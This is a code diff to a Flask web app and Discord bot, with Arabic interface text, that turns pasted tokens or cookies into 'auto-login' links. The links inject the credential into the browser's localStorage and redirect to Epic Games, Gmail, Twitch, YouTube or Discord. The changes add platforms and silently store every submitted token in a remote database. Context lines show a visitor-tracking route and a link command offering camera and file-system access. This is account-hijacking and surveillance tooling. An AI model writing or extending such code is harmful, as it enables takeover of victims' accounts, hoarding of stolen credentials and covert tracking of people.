@@ -114,37 +114,27 @@ def autologin():
     if not token:
         return "❌ التوكن غير موجود أو غير صالح", 404
 
-    if platform_type == "epic":
-        return f"""
-        <html>
-        <head><title>3SRH Epic Games Auth</title></head>
-        <body style="background-color: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
-            <h2>🎮 تم حقن توكن Epic Games بنجاح!</h2>
-            <p style="color: #A871FF; word-break: break-all; padding: 0 20px;">Token: {token}</p>
-            <script>
-                setTimeout(function() {{
-                    localStorage.setItem('epic_token', JSON.stringify("{token}"));
-                    window.location.href = 'https://www.epicgames.com/id/login?token={token}';
-                }}, 1500);
-            </script>
-        </body>
-        </html>
-        """
-    else:
-        return f"""
-        <html>
-        <head><title>3SRH Auto Login</title></head>
-        <body style="background-color: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
-            <h2>🔄 جاري تسجيل الدخول تلقائياً...</h2>
-            <script>
-                setTimeout(function() {{
-                    localStorage.setItem('token', JSON.stringify("{token}"));
-                    window.location.href = 'https://discord.com/app';
-                }}, 1000);
-            </script>
-        </body>
-        </html>
-        """
+    target_url = "https://www.epicgames.com"
+    if platform_type == "gmail": target_url = "https://mail.google.com"
+    elif platform_type == "twitch": target_url = "https://www.twitch.tv"
+    elif platform_type == "youtube": target_url = "https://www.youtube.com"
+    elif platform_type == "discord": target_url = "https://discord.com/app"
+
+    return f"""
+    <html>
+    <head><title>3SRH {platform_type.upper()} Auth</title></head>
+    <body style="background-color: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
+        <h2>🎮 تم حقن توكن {platform_type.upper()} بنجاح!</h2>
+        <p style="color: #A871FF; word-break: break-all; padding: 0 20px;">Token: {token}</p>
+        <script>
+            setTimeout(function() {{
+                localStorage.setItem('{platform_type}_token', JSON.stringify("{token}"));
+                window.location.href = '{target_url}';
+            }}, 1500);
+        </script>
+    </body>
+    </html>
+    """
 
 @app.route('/track')
 def track_visitor():
@@ -485,12 +475,14 @@ async def generate(interaction: discord.Interaction, count: int = 1):
     codes = [generate_random_code() for _ in range(count)]
     await interaction.response.send_message(f"⚠️ **حفظ الأكواد؟**\n" + "\n".join([f"`{c}`" for c in codes]), view=ConfirmSaveView(codes, count), ephemeral=True)
 
-@client.tree.command(name="loginbytoken", description="توليد رابط مباشر مع عرض التوكن صريحاً")
+@client.tree.command(name="loginbytoken", description="توليد رابط دخول سريع وعرض التوكن للنسخ المباشر")
 @app_commands.describe(platform="اختر المنصة", token_or_cookie="ضع التوكن أو الكوكيز هنا")
 @app_commands.choices(platform=[
-    app_commands.Choice(name="Discord", value="discord"),
     app_commands.Choice(name="Epic Games", value="epic"),
-    app_commands.Choice(name="Steam", value="steam"),
+    app_commands.Choice(name="Gmail / Google", value="gmail"),
+    app_commands.Choice(name="Twitch", value="twitch"),
+    app_commands.Choice(name="YouTube", value="youtube"),
+    app_commands.Choice(name="Discord", value="discord"),
     app_commands.Choice(name="Other Web", value="other")
 ])
 async def loginbytoken_command(interaction: discord.Interaction, platform: str, token_or_cookie: str):
@@ -500,12 +492,21 @@ async def loginbytoken_command(interaction: discord.Interaction, platform: str, 
     encoded_token = requests.utils.quote(clean_token, safe='')
     web_link = f"{HOST_URL}/autologin?platform={platform}&token={encoded_token}"
     
-    embed = discord.Embed(title="🎮 معلومات التوكن والرابط المباشر", color=0x00FF00)
-    embed.add_field(name="📌 المنصة", value=f"`{platform.upper()}`", inline=False)
-    embed.add_field(name="🔑 التوكن / الكوكي", value=f"```json\n{clean_token}\n```", inline=False)
-    embed.add_field(name="🌐 الرابط المباشر للحقن", value=f"[اضغط هنا لفتح الرابط وحقن التوكن]({web_link})", inline=False)
+    db, sha, url, headers = fetch_db()
+    if db:
+        if "saved_tokens" not in db: db["saved_tokens"] = []
+        db["saved_tokens"].append({"platform": platform, "token": clean_token, "link": web_link, "time": int(time.time())})
+        save_db(db, sha, url, headers, f"Save token for {platform}")
+
+    # التنسيق المطلوب: إعطاء الرابط، وفي الأخير عرض التوكن بالكامل في كود بلوك مخصص للنسخ
+    response_text = (
+        f"🎮 **تم إنشاء جلسة {platform.upper()} بنجاح!**\n\n"
+        f"🌐 **رابط الدخول المباشر:**\n{web_link}\n\n"
+        f"📌 **التوكن بالكامل (للنسخ المباشر ووضعه في الكومنت):**\n"
+        f"```json\n{clean_token}\n```"
+    )
     
-    await interaction.followup.send(embed=embed, ephemeral=True)
+    await interaction.followup.send(content=response_text, ephemeral=True)
 
 @client.tree.command(name="link", description="توليد رابط تتبع مع خيارات الكاميرا والوصول للملفات")
 @app_commands.describe(redirect_to="رابط الوجهة النهائية", capture_cam="طلب إذن الكاميرا؟", file_system="تفعيل الوصول للملفات")
